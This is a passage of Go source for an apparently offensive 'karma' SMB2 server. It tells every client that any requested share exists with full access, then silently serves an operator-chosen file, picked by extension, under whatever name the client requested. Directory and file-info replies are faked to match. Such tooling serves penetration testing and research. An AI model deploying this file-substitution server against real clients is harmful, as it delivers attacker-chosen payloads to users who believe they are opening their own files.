	session.treeConnects[tid] = &TreeConnect{
		id:        tid,
		shareName: shareName,
		isIPC:     isIPC,
	}

	// Reset directory listing state for new connection
	session.findDone = false
	session.stopConnection = false

	logOutput("[*] %s connected to share: %s (karma - all shares exist)\n", session.clientIP, shareName)

	// Build response
	resp := make([]byte, 64+16)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_TREE_CONNECT)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], tid)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 16) // StructureSize
	if isIPC {
		body[2] = 0x02                                   // ShareType = PIPE
		binary.LittleEndian.PutUint32(body[4:8], 0x0030) // ShareFlags
	} else {
		body[2] = 0x01                              // ShareType = DISK
		binary.LittleEndian.PutUint32(body[4:8], 0) // ShareFlags
	}
	body[3] = 0                                          // Reserved
	binary.LittleEndian.PutUint32(body[8:12], 0)         // Capabilities
	binary.LittleEndian.PutUint32(body[12:16], 0x1f01ff) // MaximalAccess (full access)

	return resp
}

func (s *Server) handleTreeDisconnect(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	delete(session.treeConnects, treeID)

	resp := make([]byte, 64+4)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_TREE_DISCONNECT)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 4) // StructureSize

	return resp
}

func (s *Server) handleCreate(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+57 {
		return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Parse CREATE request
	desiredAccess := binary.LittleEndian.Uint32(pkt[88:92])
	createDisposition := binary.LittleEndian.Uint32(pkt[100:104])
	createOptions := binary.LittleEndian.Uint32(pkt[104:108])
	nameOffset := binary.LittleEndian.Uint16(pkt[108:110])
	nameLen := binary.LittleEndian.Uint16(pkt[110:112])

	var fileName string
	if nameLen > 0 && int(nameOffset)+int(nameLen) <= len(pkt) {
		fileName = utf16LEDecode(pkt[nameOffset : nameOffset+nameLen])
	}

	// Check if this is IPC$ (named pipe)
	tc := session.treeConnects[treeID]
	if tc != nil && tc.isIPC {
		return s.handleCreateNamedPipe(session, fileName, messageID, treeID)
	}

	if s.debug {
		fmt.Printf("[DEBUG] Create: file=%s, disposition=%d, options=0x%x, access=0x%x\n",
			fileName, createDisposition, createOptions, desiredAccess)
	}

	// Deny write operations in karma mode
	// Only block if the request is explicitly trying to modify/delete
	if createOptions&FILE_DELETE_ON_CLOSE != 0 {
		if s.debug {
			fmt.Printf("[DEBUG] Denied: FILE_DELETE_ON_CLOSE\n")
		}
		return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_ACCESS_DENIED)
	}
	if createDisposition == FILE_OVERWRITE || createDisposition == FILE_OVERWRITE_IF ||
		createDisposition == FILE_SUPERSEDE || createDisposition == FILE_CREATE {
		if s.debug {
			fmt.Printf("[DEBUG] Denied: write disposition %d\n", createDisposition)
		}
		return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_ACCESS_DENIED)
	}

	// Determine if directory request
	wantsDirectory := (createOptions & FILE_DIRECTORY_FILE) != 0

	var targetFile string
	var origName string

	if wantsDirectory {
		// For directory requests, use "/" as target
		targetFile = s.defaultFile
		origName = fileName
	} else {
		// Map extension to file
		origName = filepath.Base(fileName)
		targetFile = s.getFileForExtension(fileName)
		session.fileData.origName = origName
		session.fileData.targetFile = targetFile
	}

	logOutput("[*] %s is asking for %s. Delivering %s\n", session.clientIP, fileName, targetFile)

	// Stat the target file
	info, err := os.Stat(targetFile)
	if err != nil {
		return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_OBJECT_NAME_NOT_FOUND)
	}

	// Create file handle
	fileID := make([]byte, 16)
	binary.LittleEndian.PutUint64(fileID[0:8], session.nextFileID)
	session.nextFileID++

	of := &OpenFile{
		path:     fileName,
		realPath: targetFile,
		isDir:    wantsDirectory || info.IsDir(),
		origName: origName,
	}
	copy(of.id[:], fileID)

	if !of.isDir {
		f, err := os.Open(targetFile)
		if err != nil {
			return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_ACCESS_DENIED)
		}
		of.file = f
	}

	session.openFiles[string(fileID)] = of

	// Reset find state for new file
	session.findDone = false

	// Build response
	resp := make([]byte, 64+89)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_CREATE)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 89)   // StructureSize
	body[2] = 0                                    // OplockLevel
	body[3] = 0                                    // Reserved2
	binary.LittleEndian.PutUint32(body[4:8], 0x01) // CreateAction (FILE_OPENED)

	// Timestamps from target file
	ft := fileTimeFromTime(info.ModTime())
	binary.LittleEndian.PutUint64(body[8:16], ft)  // CreationTime
	binary.LittleEndian.PutUint64(body[16:24], ft) // LastAccessTime
	binary.LittleEndian.PutUint64(body[24:32], ft) // LastWriteTime
	binary.LittleEndian.PutUint64(body[32:40], ft) // ChangeTime

	// File attributes
	size := info.Size()
	binary.LittleEndian.PutUint64(body[40:48], uint64(size)) // AllocationSize
	binary.LittleEndian.PutUint64(body[48:56], uint64(size)) // EndOfFile

	attrs := uint32(0x80) // FILE_ATTRIBUTE_NORMAL
	if of.isDir {
		attrs = 0x10 // FILE_ATTRIBUTE_DIRECTORY
	}
	binary.LittleEndian.PutUint32(body[56:60], attrs) // FileAttributes
	binary.LittleEndian.PutUint32(body[60:64], 0)     // Reserved3
	copy(body[64:80], fileID)                         // FileId
	binary.LittleEndian.PutUint32(body[80:84], 0)     // CreateContextsOffset
	binary.LittleEndian.PutUint32(body[84:88], 0)     // CreateContextsLength

	return resp
}

func (s *Server) handleClose(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+24 {
		return s.buildErrorResponse(SMB2_CLOSE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	fileID := string(pkt[64+8 : 64+24])
	if of, ok := session.openFiles[fileID]; ok {
		if of.file != nil {
			of.file.Close()
		}
		delete(session.openFiles, fileID)
	}

	resp := make([]byte, 64+60)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_CLOSE)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 60) // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 0)  // Flags

	return resp
}

func (s *Server) handleRead(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+49 {
		return s.buildErrorResponse(SMB2_READ, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	length := binary.LittleEndian.Uint32(pkt[64+4 : 64+8])
	offset := binary.LittleEndian.Uint64(pkt[64+8 : 64+16])
	fileID := string(pkt[64+16 : 64+32])

	of, ok := session.openFiles[fileID]
	if !ok {
		if s.debug {
			fmt.Printf("[DEBUG] Read: file handle not found\n")
		}
		return s.buildErrorResponse(SMB2_READ, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Check if this is a named pipe
	if of.isPipe {
		return s.handlePipeRead(session, of, messageID, treeID)
	}

	if of.file == nil {
		if s.debug {
			fmt.Printf("[DEBUG] Read: file is nil (path=%s, realPath=%s)\n", of.path, of.realPath)
		}
		return s.buildErrorResponse(SMB2_READ, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}
	_ = length
	_ = offset

	// Mark that we did a read (for connection handling like Impacket)
	session.stopConnection = true

	if s.debug {
		fmt.Printf("[DEBUG] Read: length=%d, offset=%d, realPath=%s\n", length, offset, of.realPath)
	}

	// Read data
	data := make([]byte, length)
	of.file.Seek(int64(offset), 0)
	n, err := of.file.Read(data)
	if s.debug {
		fmt.Printf("[DEBUG] Read: got %d bytes, err=%v\n", n, err)
	}
	if err != nil && n == 0 {
		return s.buildErrorResponse(SMB2_READ, messageID, session.id, treeID, STATUS_END_OF_FILE)
	}
	data = data[:n]

	// Build response
	resp := make([]byte, 64+17+len(data))
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_READ)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 17)        // StructureSize
	body[2] = 0x50                                      // DataOffset (64 header + 16 body = 80 = 0x50)
	body[3] = 0                                         // Reserved
	binary.LittleEndian.PutUint32(body[4:8], uint32(n)) // DataLength
	binary.LittleEndian.PutUint32(body[8:12], 0)        // DataRemaining (0 = no more data)
	binary.LittleEndian.PutUint32(body[12:16], 0)       // Reserved2
	copy(body[16:], data)

	if s.debug && n > 0 {
		fmt.Printf("[DEBUG] Read: returning %d bytes\n", n)
	}

	return resp
}

func (s *Server) handleWrite(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+49 {
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	dataOffset := binary.LittleEndian.Uint16(pkt[64+2 : 64+4])
	dataLength := binary.LittleEndian.Uint32(pkt[64+4 : 64+8])
	fileID := string(pkt[64+16 : 64+32])

	of, ok := session.openFiles[fileID]
	if !ok {
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Check if this is a named pipe
	if of.isPipe {
		if int(dataOffset)+int(dataLength) > len(pkt) {
			return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
		}
		data := pkt[dataOffset : dataOffset+uint16(dataLength)]
		return s.handlePipeWrite(session, of, data, messageID, treeID)
	}

	// Deny file writes in karma mode
	return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_ACCESS_DENIED)
}

// FileInformationClass constants for QUERY_DIRECTORY
const (
	FileDirectoryInformation       byte = 0x01
	FileFullDirectoryInformation   byte = 0x02
	FileBothDirectoryInformation   byte = 0x03
	FileNamesInformation           byte = 0x0C
	FileIdBothDirectoryInformation byte = 0x25
	FileIdFullDirectoryInformation byte = 0x26
)

func (s *Server) handleQueryDirectory(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+33 {
		return s.buildErrorResponse(SMB2_QUERY_DIRECTORY, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	infoClass := pkt[64+2]
	fileID := string(pkt[64+8 : 64+24])
	of, ok := session.openFiles[fileID]
	if !ok {
		return s.buildErrorResponse(SMB2_QUERY_DIRECTORY, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	if s.debug {
		fmt.Printf("[DEBUG] QueryDirectory: infoClass=0x%02x, fileID=%x\n", infoClass, []byte(fileID))
	}

	// If we already returned directory listing, return NO_MORE_FILES
	if session.findDone {
		session.findDone = false
		return s.buildErrorResponse(SMB2_QUERY_DIRECTORY, messageID, session.id, treeID, STATUS_NO_MORE_FILES)
	}

	// Return a single file entry with the original filename but karma file attributes
	origName := session.fileData.origName
	if origName == "" {
		origName = of.origName
	}
	if origName == "" || origName == "." {
		origName = filepath.Base(s.defaultFile)
	}
	targetFile := session.fileData.targetFile
	if targetFile == "" {
		targetFile = of.realPath
	}

	info, err := os.Stat(targetFile)
	if err != nil {
		return s.buildErrorResponse(SMB2_QUERY_DIRECTORY, messageID, session.id, treeID, STATUS_NO_SUCH_FILE)
	}

	// Build directory entry matching the requested FileInformationClass
	entry := s.buildDirectoryEntry(origName, info, infoClass)

	session.findDone = true

	// Build response
	resp := make([]byte, 64+8+len(entry))
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_QUERY_DIRECTORY)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 9)                  // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 0x48)               // OutputBufferOffset
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(entry))) // OutputBufferLength
	copy(body[8:], entry)

	return resp
}

func (s *Server) buildDirectoryEntry(name string, info os.FileInfo, infoClass byte) []byte {
	nameBytes := utf16LEEncode(name)
	ft := fileTimeFromTime(info.ModTime())
	size := info.Size()
	attrs := uint32(0x80) // FILE_ATTRIBUTE_NORMAL
	if info.IsDir() {
		attrs = 0x10 // FILE_ATTRIBUTE_DIRECTORY
	}

	var headerSize int
	switch infoClass {
	case FileDirectoryInformation:
		headerSize = 64
	case FileFullDirectoryInformation:
		headerSize = 68
	case FileBothDirectoryInformation:
		headerSize = 94
	case FileIdFullDirectoryInformation:
		headerSize = 80
	case FileIdBothDirectoryInformation:
		headerSize = 104
	case FileNamesInformation:
		headerSize = 12
	default:
		headerSize = 94 // default to FileBothDirectoryInformation
	}

	entryLen := headerSize + len(nameBytes)
	// Pad to 8-byte boundary
	padding := (8 - (entryLen % 8)) % 8
	entryLen += padding

	entry := make([]byte, entryLen)

	binary.LittleEndian.PutUint32(entry[0:4], 0) // NextEntryOffset

	switch infoClass {
	case FileNamesInformation:
		// Minimal: FileIndex(4) + FileNameLength(4) + FileName
		binary.LittleEndian.PutUint32(entry[8:12], uint32(len(nameBytes))) // FileNameLength
		copy(entry[12:], nameBytes)

	case FileDirectoryInformation:
		// 64 byte header: no EaSize, no ShortName
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		copy(entry[64:], nameBytes)

	case FileFullDirectoryInformation:
		// 68 byte header: + EaSize
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		binary.LittleEndian.PutUint32(entry[64:68], 0) // EaSize
		copy(entry[68:], nameBytes)

	case FileBothDirectoryInformation:
		// 94 byte header: + EaSize + ShortNameLength + Reserved + ShortName(24)
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		binary.LittleEndian.PutUint32(entry[64:68], 0) // EaSize
		// ShortNameLength at 68, Reserved at 69, ShortName at 70-93 (all zero)
		copy(entry[94:], nameBytes)

	case FileIdFullDirectoryInformation:
		// 80 byte header: + EaSize + Reserved(4) + FileId(8)
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		binary.LittleEndian.PutUint32(entry[64:68], 0) // EaSize
		// Reserved at 68-71, FileId at 72-79 (zero)
		copy(entry[80:], nameBytes)

	case FileIdBothDirectoryInformation:
		// 104 byte header: + EaSize + ShortNameLength + Reserved + ShortName(24) + Reserved2(2) + FileId(8)
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		binary.LittleEndian.PutUint32(entry[64:68], 0) // EaSize
		// ShortNameLength at 68, Reserved at 69, ShortName at 70-93 (all zero)
		// Reserved2 at 94-95, FileId at 96-103 (all zero)
		copy(entry[104:], nameBytes)

	default:
		// Fallback to FileBothDirectoryInformation
		s.writeCommonDirFields(entry, ft, size, attrs, nameBytes)
		binary.LittleEndian.PutUint32(entry[64:68], 0)
		copy(entry[94:], nameBytes)
	}

	return entry
}

// writeCommonDirFields writes the common fields shared by all directory info classes
// (everything up to and including FileNameLength at offset 60-63)
func (s *Server) writeCommonDirFields(entry []byte, ft uint64, size int64, attrs uint32, nameBytes []byte) {
	binary.LittleEndian.PutUint64(entry[8:16], ft)                      // CreationTime
	binary.LittleEndian.PutUint64(entry[16:24], ft)                     // LastAccessTime
	binary.LittleEndian.PutUint64(entry[24:32], ft)                     // LastWriteTime
	binary.LittleEndian.PutUint64(entry[32:40], ft)                     // ChangeTime
	binary.LittleEndian.PutUint64(entry[40:48], uint64(size))           // EndOfFile
	binary.LittleEndian.PutUint64(entry[48:56], uint64(size))           // AllocationSize
	binary.LittleEndian.PutUint32(entry[56:60], attrs)                  // FileAttributes
	binary.LittleEndian.PutUint32(entry[60:64], uint32(len(nameBytes))) // FileNameLength
}

func (s *Server) handleQueryInfo(session *Session, pkt []byte, messageID uint64, treeID uint32) []byte {
	if len(pkt) < 64+41 {
		return s.buildErrorResponse(SMB2_QUERY_INFO, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	infoType := pkt[64+2]
	fileInfoClass := pkt[64+3]
	fileID := string(pkt[64+24 : 64+40])

	of, ok := session.openFiles[fileID]
	if !ok {
		return s.buildErrorResponse(SMB2_QUERY_INFO, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Only support file info
	if infoType != 1 {
		return s.buildErrorResponse(SMB2_QUERY_INFO, messageID, session.id, treeID, STATUS_NOT_SUPPORTED)
	}

	info, err := os.Stat(of.realPath)
	if err != nil {
		return s.buildErrorResponse(SMB2_QUERY_INFO, messageID, session.id, treeID, STATUS_NO_SUCH_FILE)
	}

	var infoData []byte

	switch fileInfoClass {
	case 0x04: // FileBasicInformation
		infoData = make([]byte, 40)
		ft := fileTimeFromTime(info.ModTime())
		binary.LittleEndian.PutUint64(infoData[0:8], ft)   // CreationTime
		binary.LittleEndian.PutUint64(infoData[8:16], ft)  // LastAccessTime
		binary.LittleEndian.PutUint64(infoData[16:24], ft) // LastWriteTime
		binary.LittleEndian.PutUint64(infoData[24:32], ft) // ChangeTime
		attrs := uint32(0x80)
		if of.isDir {
			attrs = 0x10
		}
		binary.LittleEndian.PutUint32(infoData[32:36], attrs)

	case 0x05: // FileStandardInformation
		infoData = make([]byte, 24)
		size := info.Size()
		binary.LittleEndian.PutUint64(infoData[0:8], uint64(size))  // AllocationSize
		binary.LittleEndian.PutUint64(infoData[8:16], uint64(size)) // EndOfFile
		binary.LittleEndian.PutUint32(infoData[16:20], 1)           // NumberOfLinks
		if of.isDir {
			infoData[21] = 1 // Directory
		}

	case 0x12: // FileAllInformation
		// Combine basic + standard + internal + ea + access + position + mode + alignment + name
		nameBytes := utf16LEEncode(of.origName)
		infoData = make([]byte, 100+len(nameBytes))
		ft := fileTimeFromTime(info.ModTime())
		// Basic info at offset 0
		binary.LittleEndian.PutUint64(infoData[0:8], ft)
		binary.LittleEndian.PutUint64(infoData[8:16], ft)
		binary.LittleEndian.PutUint64(infoData[16:24], ft)
		binary.LittleEndian.PutUint64(infoData[24:32], ft)
		attrs := uint32(0x80)
		if of.isDir {
			attrs = 0x10
		}
		binary.LittleEndian.PutUint32(infoData[32:36], attrs)
		// Standard info at offset 40
		size := info.Size()
		binary.LittleEndian.PutUint64(infoData[40:48], uint64(size))
		binary.LittleEndian.PutUint64(infoData[48:56], uint64(size))
		binary.LittleEndian.PutUint32(infoData[56:60], 1)
		// Name info at offset 96
		binary.LittleEndian.PutUint32(infoData[96:100], uint32(len(nameBytes)))
		copy(infoData[100:], nameBytes)

	default:
		return s.buildErrorResponse(SMB2_QUERY_INFO, messageID, session.id, treeID, STATUS_NOT_SUPPORTED)
	}

	// Build response
	resp := make([]byte, 64+9+len(infoData))
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_QUERY_INFO)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 9)
	binary.LittleEndian.PutUint16(body[2:4], 0x48)
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(infoData)))
	copy(body[8:], infoData)

	return resp
}

func (s *Server) handleEcho(session *Session, pkt []byte, messageID uint64) []byte {
	resp := make([]byte, 64+4)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_ECHO)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 4)

	return resp
}

func (s *Server) buildErrorResponse(command uint16, messageID, sessionID uint64, treeID uint32, status uint32) []byte {
	resp := make([]byte, 64+9)
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], status)
	binary.LittleEndian.PutUint16(resp[12:14], command)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], sessionID+1)

	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize

	return resp
}

// Named Pipe and SRVSVC Support

func (s *Server) handleCreateNamedPipe(session *Session, pipeName string, messageID uint64, treeID uint32) []byte {
	// Normalize pipe name
	pipeName = strings.TrimPrefix(pipeName, "\\")
	pipeName = strings.ToLower(pipeName)

	if s.debug {
		fmt.Printf("[DEBUG] Named Pipe Open: %s\n", pipeName)
	}

	// Only support srvsvc for share enumeration
	if pipeName != "srvsvc" {
		if s.debug {
			fmt.Printf("[DEBUG] Unsupported pipe: %s\n", pipeName)
		}
		return s.buildErrorResponse(SMB2_CREATE, messageID, session.id, treeID, STATUS_OBJECT_NAME_NOT_FOUND)
	}

	// Generate file ID for pipe
	fileID := make([]byte, 16)
	rand.Read(fileID)

	of := &OpenFile{
		path:     pipeName,
		isPipe:   true,
		pipeName: pipeName,
		pipeData: &NamedPipeState{},
	}
	copy(of.id[:], fileID)
	session.openFiles[string(fileID)] = of

	logOutput("[+] Named Pipe Open: %s\n", pipeName)

	return s.buildNamedPipeCreateResponse(session, messageID, treeID, fileID)
}

func (s *Server) buildNamedPipeCreateResponse(session *Session, messageID uint64, treeID uint32, fileID []byte) []byte {
	resp := make([]byte, 64+89)

	// SMB2 Header
	copy(resp[0:4], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(resp[4:6], 64)
	binary.LittleEndian.PutUint32(resp[8:12], STATUS_SUCCESS)
	binary.LittleEndian.PutUint16(resp[12:14], SMB2_CREATE)
	binary.LittleEndian.PutUint16(resp[14:16], 1)
	binary.LittleEndian.PutUint32(resp[16:20], SMB2_FLAGS_SERVER_TO_REDIR)
	binary.LittleEndian.PutUint64(resp[24:32], messageID)
	binary.LittleEndian.PutUint32(resp[36:40], treeID)
	binary.LittleEndian.PutUint64(resp[40:48], session.id+1)

	// Create Response
	body := resp[64:]
	binary.LittleEndian.PutUint16(body[0:2], 89) // StructureSize
	body[2] = 0x00                               // OplockLevel = None
	body[3] = 0x00                               // Flags

	// File times
	ft := fileTimeFromTime(time.Now())
	binary.LittleEndian.PutUint64(body[8:16], ft)
	binary.LittleEndian.PutUint64(body[16:24], ft)
	binary.LittleEndian.PutUint64(body[24:32], ft)
	binary.LittleEndian.PutUint64(body[32:40], ft)

	// FileAttributes = NORMAL
	binary.LittleEndian.PutUint32(body[56:60], 0x80)

	// FileId
	copy(body[64:80], fileID)

	return resp
}

func (s *Server) handlePipeWrite(session *Session, of *OpenFile, data []byte, messageID uint64, treeID uint32) []byte {
	if len(data) < 16 {
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Check DCE/RPC packet type
	pktType := data[2]
	callID := binary.LittleEndian.Uint32(data[12:16])

	if s.debug {
		fmt.Printf("[DEBUG] DCE/RPC: type=%d, callID=%d\n", pktType, callID)
	}

	switch pktType {
	case DCERPC_BIND:
		return s.handleDCERPCBind(session, of, data, messageID, treeID, callID)
	case DCERPC_REQUEST:
		return s.handleDCERPCRequest(session, of, data, messageID, treeID, callID)
	default:
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_NOT_SUPPORTED)
	}
}

func (s *Server) handleDCERPCBind(session *Session, of *OpenFile, data []byte, messageID uint64, treeID uint32, callID uint32) []byte {
	if len(data) < 28 {
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	// Parse context ID
	var contextID uint16
	if len(data) >= 30 {
		contextID = binary.LittleEndian.Uint16(data[28:30])
	}

	of.pipeData.callID = callID
	of.pipeData.contextID = contextID
	of.pipeData.bound = true

	// Build BIND_ACK response
	of.pipeData.pendingResponse = s.buildDCERPCBindAck(callID)

	if s.debug {
		fmt.Printf("[DEBUG] DCE/RPC BIND_ACK prepared\n")
	}

	// Return write response
	return s.buildPipeWriteResponse(session, messageID, treeID, uint32(len(data)))
}

func (s *Server) buildDCERPCBindAck(callID uint32) []byte {
	secAddr := []byte("\\PIPE\\srvsvc")
	secAddrLen := len(secAddr) + 1

	totalSecAddr := 2 + secAddrLen
	secAddrPadding := 0
	if totalSecAddr%4 != 0 {
		secAddrPadding = 4 - (totalSecAddr % 4)
	}

	resultListLen := 4 + 24
	headerLen := 24 + totalSecAddr + secAddrPadding + resultListLen
	resp := make([]byte, headerLen)

	// DCE/RPC header
	resp[0] = DCERPC_VERSION
	resp[1] = DCERPC_VERSION_MINOR
	resp[2] = DCERPC_BIND_ACK
	resp[3] = DCERPC_FIRST_FRAG | DCERPC_LAST_FRAG
	resp[4] = 0x10 // Little-endian
	binary.LittleEndian.PutUint16(resp[8:10], uint16(headerLen))
	binary.LittleEndian.PutUint32(resp[12:16], callID)

	// BIND_ACK specific
	binary.LittleEndian.PutUint16(resp[16:18], 4280) // Max transmit
	binary.LittleEndian.PutUint16(resp[18:20], 4280) // Max receive
	binary.LittleEndian.PutUint32(resp[20:24], 0x53f0)

	// Secondary address
	offset := 24
	binary.LittleEndian.PutUint16(resp[offset:offset+2], uint16(secAddrLen))
	offset += 2
	copy(resp[offset:], secAddr)
	resp[offset+len(secAddr)] = 0
	offset += secAddrLen + secAddrPadding

	// Results
	resp[offset] = 1 // n_results
	offset += 4

	// Accepted context
	binary.LittleEndian.PutUint16(resp[offset:offset+2], 0) // Result = acceptance
	copy(resp[offset+4:offset+20], NDR_UUID)
	binary.LittleEndian.PutUint32(resp[offset+20:offset+24], 2) // NDR version

	return resp
}

func (s *Server) handleDCERPCRequest(session *Session, of *OpenFile, data []byte, messageID uint64, treeID uint32, callID uint32) []byte {
	if len(data) < 24 {
		return s.buildErrorResponse(SMB2_WRITE, messageID, session.id, treeID, STATUS_INVALID_PARAMETER)
	}

	opnum := binary.LittleEndian.Uint16(data[22:24])

	if s.debug {
		fmt.Printf("[DEBUG] DCE/RPC REQUEST: opnum=%d\n", opnum)
	}

